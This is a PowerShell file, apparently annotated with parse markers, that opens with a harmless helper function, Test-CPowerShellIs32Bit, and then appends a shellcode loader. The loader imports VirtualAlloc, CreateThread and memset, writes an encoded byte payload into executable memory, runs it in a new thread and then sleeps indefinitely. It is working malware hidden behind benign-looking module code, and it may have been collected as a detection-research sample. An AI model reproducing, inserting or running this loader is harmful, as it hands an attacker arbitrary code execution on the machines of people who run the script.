
 -||-> function Test-CPowerShellIs32Bit
{
    
    [CmdletBinding()]
    param(
    )
    
     -||-> Set-StrictMode -Version 'Latest' <-||- 

     -||-> Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState <-||- 

    return  -||-> -not ( -||-> Test-CPowerShellIs64Bit <-||- ) <-||- 
} <-||- 

 -||-> $LYQ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $LYQ -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xdf,0xd9,0x74,0x24,0xf4,0xbb,0xa2,0xc1,0x7c,0xcf,0x58,0x29,0xc9,0xb1,0x47,0x31,0x58,0x18,0x83,0xc0,0x04,0x03,0x58,0xb6,0x23,0x89,0x33,0x5e,0x21,0x72,0xcc,0x9e,0x46,0xfa,0x29,0xaf,0x46,0x98,0x3a,0x9f,0x76,0xea,0x6f,0x13,0xfc,0xbe,0x9b,0xa0,0x70,0x17,0xab,0x01,0x3e,0x41,0x82,0x92,0x13,0xb1,0x85,0x10,0x6e,0xe6,0x65,0x29,0xa1,0xfb,0x64,0x6e,0xdc,0xf6,0x35,0x27,0xaa,0xa5,0xa9,0x4c,0xe6,0x75,0x41,0x1e,0xe6,0xfd,0xb6,0xd6,0x09,0x2f,0x69,0x6d,0x50,0xef,0x8b,0xa2,0xe8,0xa6,0x93,0xa7,0xd5,0x71,0x2f,0x13,0xa1,0x83,0xf9,0x6a,0x4a,0x2f,0xc4,0x43,0xb9,0x31,0x00,0x63,0x22,0x44,0x78,0x90,0xdf,0x5f,0xbf,0xeb,0x3b,0xd5,0x24,0x4b,0xcf,0x4d,0x81,0x6a,0x1c,0x0b,0x42,0x60,0xe9,0x5f,0x0c,0x64,0xec,0x8c,0x26,0x90,0x65,0x33,0xe9,0x11,0x3d,0x10,0x2d,0x7a,0xe5,0x39,0x74,0x26,0x48,0x45,0x66,0x89,0x35,0xe3,0xec,0x27,0x21,0x9e,0xae,0x2f,0x86,0x93,0x50,0xaf,0x80,0xa4,0x23,0x9d,0x0f,0x1f,0xac,0xad,0xd8,0xb9,0x2b,0xd2,0xf2,0x7e,0xa3,0x2d,0xfd,0x7e,0xed,0xe9,0xa9,0x2e,0x85,0xd8,0xd1,0xa4,0x55,0xe5,0x07,0x50,0x53,0x71,0x68,0x0d,0x5a,0x82,0x00,0x4c,0x5d,0x95,0x8c,0xd9,0xbb,0xc5,0x7c,0x8a,0x13,0xa5,0x2c,0x6a,0xc4,0x4d,0x27,0x65,0x3b,0x6d,0x48,0xaf,0x54,0x07,0xa7,0x06,0x0c,0xbf,0x5e,0x03,0xc6,0x5e,0x9e,0x99,0xa2,0x60,0x14,0x2e,0x52,0x2e,0xdd,0x5b,0x40,0xc6,0x2d,0x16,0x3a,0x40,0x31,0x8c,0x51,0x6c,0xa7,0x2b,0xf0,0x3b,0x5f,0x36,0x25,0x0b,0xc0,0xc9,0x00,0x00,0xc9,0x5f,0xeb,0x7e,0x36,0xb0,0xeb,0x7e,0x60,0xda,0xeb,0x16,0xd4,0xbe,0xbf,0x03,0x1b,0x6b,0xac,0x98,0x8e,0x94,0x85,0x4d,0x18,0xfd,0x2b,0xa8,0x6e,0xa2,0xd4,0x9f,0x6e,0x9e,0x02,0xd9,0x04,0xce,0x96 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $bKS=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $bKS.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$bKS,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



